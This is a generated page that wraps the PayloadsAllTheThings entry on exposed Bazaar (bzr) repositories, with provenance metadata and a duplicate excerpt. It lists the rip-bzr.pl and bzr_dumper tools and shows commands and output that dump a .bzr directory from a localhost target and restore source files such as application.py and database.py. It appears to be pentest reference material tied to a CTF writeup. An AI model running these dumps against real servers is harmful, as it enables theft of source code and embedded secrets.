---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Bazaar

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-source-code-management-bazaar` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Source Code Management/Bazaar.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Bazaar  (also known as bzr ) is a free, distributed version control system (DVCS) that helps you track project history over time and collaborate seamlessly with others. Developed by Canonical, Bazaar emphasizes ease of use, a flexible workf

## Preserved Body

````markdown
> Bazaar  (also known as bzr ) is a free, distributed version control system (DVCS) that helps you track project history over time and collaborate seamlessly with others. Developed by Canonical, Bazaar emphasizes ease of use, a flexible workflow, and rich features to cater to both individual developers and large teams.

## Tools

### rip-bzr.pl

* [kost/dvcs-ripper/rip-bzr.pl](https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl)

    ```powershell
    docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
    ```

### bzr_dumper

* [SeahunOh/bzr_dumper](https://github.com/SeahunOh/bzr_dumper)

```powershell
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
Created a standalone tree (format: 2a)
[!] Target : http://127.0.0.1:5000/
[+] Start.
[+] GET repository/pack-names
[+] GET README
[+] GET checkout/dirstate
[+] GET checkout/views
[+] GET branch/branch.conf
[+] GET branch/format
[+] GET branch/last-revision
[+] GET branch/tag
[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] Finish
```

```powershell
bzr revert
 N  application.py
 N  database.py
 N  static/
```

## References

* [STEM CTF Cyber Challenge 2019 – My First Blog - m3ssap0 / zuzzur3ll0n1 - March 2, 2019](https://web.archive.org/web/20200926122213/https://ctftime.org/writeup/13380)
````

## Source Verification

[source record](../../sources/payloadsallthethings/bazaar.md)

## Evidence Excerpt

````text
_body: "# Bazaar\n\n> Bazaar  (also known as bzr ) is a free, distributed version control system (DVCS) that helps you track\
\ project history over time and collaborate seamlessly with others. Developed by Canonical, Bazaar emphasizes ease of use,\
\ a flexible workflow, and rich features to cater to both individual developers and large teams.\n\n## Summary\n\n* [Tools](#tools)\n\
\    * [rip-bzr.pl](#rip-bzrpl)\n    * [bzr_dumper](#bzr_dumper)\n* [References](#references)\n\n## Tools\n\n### rip-bzr.pl\n\
\n* [kost/dvcs-ripper/rip-bzr.pl](https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl)\n\n    ```powershell\n\
\    docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u\n    ```\n\n### bzr_dumper\n\
\n* [SeahunOh/bzr_dumper](https://github.com/SeahunOh/bzr_dumper)\n\n```powershell\npython3 dumper.py -u \"http://127.0.0.1:5000/\"\
\ -o source\nCreated a standalone tree (format: 2a)\n[!] Target : http://127.0.0.1:5000/\n[+] Start.\n[+] GET repository/pack-names\n\
````
